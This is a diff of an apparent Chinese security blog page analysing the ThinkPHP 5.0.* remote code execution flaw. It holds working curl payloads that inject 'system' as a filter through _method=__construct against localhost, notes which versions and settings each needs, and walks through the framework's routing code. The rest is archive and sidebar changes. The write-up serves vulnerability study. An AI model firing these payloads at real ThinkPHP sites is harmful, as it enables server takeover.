@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,218</span> / Reading time: <span class="post-count">12 min</span></span>
+                        <span>Word count: <span class="post-count">2,261</span> / Reading time: <span class="post-count">12 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -391,7 +391,7 @@
             <main class="main post-page">
     <article class="article-entry">
         <p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">需要开启debug版本:</span><br><span class="line">payload1:</span><br><span class="line">第一次执行system:</span><br><span class="line">curl -v -d &quot;_method=__construct&amp;filter[]=system&quot; &quot;http://localhost/think/public/index.php?a=dir&quot;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">第二次执行system:</span><br><span class="line">curl -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al&quot; http://localhost/think/public/index.php</span><br><span class="line"></span><br><span class="line">不需要开启debug版本，但需要是完整版，很容易满足:</span><br><span class="line"> curl -v -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=dir&quot; &quot;http://localhost/loudong/public/index.php?s=captcha&amp;a=dir&quot;</span><br><span class="line"></span><br><span class="line">5.0.10比较特殊,既不需要开启debug,也不要求是完整版：</span><br><span class="line"> curl -v -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&quot; &quot;http://localhost/loudong/public/index.php?s=index/index/index&amp;a=dir&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">需要开启debug版本:</span><br><span class="line">payload1:</span><br><span class="line">第一次执行system:</span><br><span class="line">curl -v -d &quot;_method=__construct&amp;filter[]=system&quot; &quot;http://localhost/think/public/index.php?a=dir&quot;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">第二次执行system:</span><br><span class="line">curl -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al&quot; http://localhost/think/public/index.php</span><br><span class="line"></span><br><span class="line">不需要开启debug版本，但需要是完整版，很容易满足:</span><br><span class="line"> curl -v -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=dir&quot; &quot;http://localhost/loudong/public/index.php?s=captcha&amp;a=dir&quot;</span><br><span class="line"></span><br><span class="line">5.0.13之前比较特殊,既不需要开启debug,也不要求是完整版：</span><br><span class="line"> curl -v -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&quot; &quot;http://localhost/loudong/public/index.php?s=index/index/index&amp;a=dir&quot;</span><br></pre></td></tr></table></figure>
 <h2 id="Thinkphp5-0-23核心板为例"><a href="#Thinkphp5-0-23核心板为例" class="headerlink" title="Thinkphp5.0.23核心板为例:"></a>Thinkphp5.0.23核心板为例:</h2><p><strong>该版本只能在开启Debug模式下，实现RCE.</strong></p>
 <p>config.php:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.................................</span><br><span class="line">// 表单请求类型伪装变量</span><br><span class="line">&apos;var_method&apos;             =&gt; &apos;_method&apos;,</span><br><span class="line">.................................</span><br></pre></td></tr></table></figure>
@@ -434,7 +434,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 路由规则检测</span><br><span class="line">        if (!empty($rules)) &#123;</span><br><span class="line">            return self::checkRoute($request, $rules, $url, $depr);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 <p>checkRoute方法:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">private static function checkRoute($request, $rules, $url, $depr = &apos;/&apos;, $group = &apos;&apos;, $options = [])</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($rules as $key =&gt; $item) &#123;</span><br><span class="line">            if (true === $item) &#123;</span><br><span class="line">                $item = self::getRouteExpress($key);</span><br><span class="line">            &#125;</span><br><span class="line">            if (!isset($item[&apos;rule&apos;])) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            $rule    = $item[&apos;rule&apos;];</span><br><span class="line">            $route   = $item[&apos;route&apos;];</span><br><span class="line">            $vars    = $item[&apos;var&apos;];</span><br><span class="line">            $option  = $item[&apos;option&apos;];</span><br><span class="line">            $pattern = $item[&apos;pattern&apos;];</span><br><span class="line"></span><br><span class="line">            // 检查参数有效性</span><br><span class="line">            if (!self::checkOption($option, $request)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (isset($option[&apos;ext&apos;])) &#123;</span><br><span class="line">                // 路由ext参数 优先于系统配置的URL伪静态后缀参数</span><br><span class="line">                $url = preg_replace(&apos;/\.&apos; . $request-&gt;ext() . &apos;$/i&apos;, &apos;&apos;, $url);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (is_array($rule)) &#123;</span><br><span class="line">                // 分组路由</span><br><span class="line">                $pos = strpos(str_replace(&apos;&lt;&apos;, &apos;:&apos;, $key), &apos;:&apos;);</span><br><span class="line">                if (false !== $pos) &#123;</span><br><span class="line">                    $str = substr($key, 0, $pos);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $str = $key;</span><br><span class="line">                &#125;</span><br><span class="line">                if (is_string($str) &amp;&amp; $str &amp;&amp; 0 !== stripos(str_replace(&apos;|&apos;, &apos;/&apos;, $url), $str)) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                self::setOption($option);</span><br><span class="line">                $result = self::checkRoute($request, $rule, $url, $depr, $key, $option);</span><br><span class="line">                if (false !== $result) &#123;</span><br><span class="line">                    return $result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; elseif ($route) &#123;</span><br><span class="line">                if (&apos;__miss__&apos; == $rule || &apos;__auto__&apos; == $rule) &#123;</span><br><span class="line">                    // 指定特殊路由</span><br><span class="line">                    $var    = trim($rule, &apos;__&apos;);</span><br><span class="line">                    $&#123;$var&#125; = $item;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                if ($group) &#123;</span><br><span class="line">                    $rule = $group . ($rule ? &apos;/&apos; . ltrim($rule, &apos;/&apos;) : &apos;&apos;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                self::setOption($option);</span><br><span class="line">                if (isset($options[&apos;bind_model&apos;]) &amp;&amp; isset($option[&apos;bind_model&apos;])) &#123;</span><br><span class="line">                    $option[&apos;bind_model&apos;] = array_merge($options[&apos;bind_model&apos;], $option[&apos;bind_model&apos;]);</span><br><span class="line">                &#125;</span><br><span class="line">                $result = self::checkRule($rule, $route, $url, $pattern, $option, $depr);</span><br><span class="line">                if (false !== $result) &#123;</span><br><span class="line">                    return $result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($auto)) &#123;</span><br><span class="line">            // 自动解析URL地址</span><br><span class="line">            return self::parseUrl($auto[&apos;route&apos;] . &apos;/&apos; . $url, $depr);</span><br><span class="line">        &#125; elseif (isset($miss)) &#123;</span><br><span class="line">            // 未匹配所有路由的路由规则处理</span><br><span class="line">            return self::parseRule(&apos;&apos;, $miss[&apos;route&apos;], $url, $miss[&apos;option&apos;]);</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>这里有效的route只有完整版中才有的<code>captcha</code>。</p>
+<p>这里有效的route除了一些默认的之外,就有完整版中才有的<code>captcha</code>。</p>
+<p>默认的route最终会调用moudle函数，其中调用<code>$request-&gt;filter($config[&#39;default_filter&#39;]);</code>清空了filter导致漏洞利用失败。</p>
 <p><img src="/assets/php/TIM截图20190112215227.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">\think\Route::get(&apos;captcha/[:id]&apos;, &quot;\\think\\captcha\\CaptchaController@index&quot;);</span><br><span class="line"></span><br><span class="line">\think\Validate::extend(&apos;captcha&apos;, function ($value, $id = &quot;&quot;) &#123;</span><br><span class="line">    return captcha_check($value, $id, (array)\think\Config::get(&apos;captcha&apos;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">\think\Validate::setTypeMsg(&apos;captcha&apos;, &apos;验证码错误!&apos;);</span><br></pre></td></tr></table></figure>
 <p>所以，需要传入<code>s=captcha</code> 并且<code>method=get</code>。</p>
@@ -457,8 +458,8 @@
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/posts/30918/" title="day-day-up">
-                    <div class="nextTitle">day-day-up</div>
+                <a href="/posts/44754/" title="dubbo-配置">
+                    <div class="nextTitle">dubbo-配置</div>
                 </a>
             
         </li>
@@ -1849,9 +1850,95 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 81
+        Total : 79
         </div>
         <!-- search  -->
         
@@ -1881,17 +1968,27 @@
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/posts/43363/">java-面试准备</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href="/posts/44754/">dubbo-配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">01/12</span><a class="archive-post-title" href="/posts/8880/">Thinkphp5.0.*之RCE漏洞分析</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/41682/">设计模式</a>
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/53933/">剑指ofer</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/53933/">剑指ofer</a>
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href="/posts/41682/">设计模式</a>
         </li>
     
     
@@ -1916,11 +2013,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/21</span><a class="archive-post-title" href="/posts/24928/">软件安装相关问题</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/33972/">otter-ctf</a>
         </li>
     
     
@@ -1970,11 +2062,6 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
         </li>
     
@@ -1986,11 +2073,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
         </li>
     
     
@@ -2065,12 +2147,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
@@ -2150,11 +2232,6 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
         </li>
     
@@ -2185,12 +2262,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
@@ -2210,12 +2287,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">linux使用相关</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
@@ -2293,23 +2370,23 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
-    
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
-        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
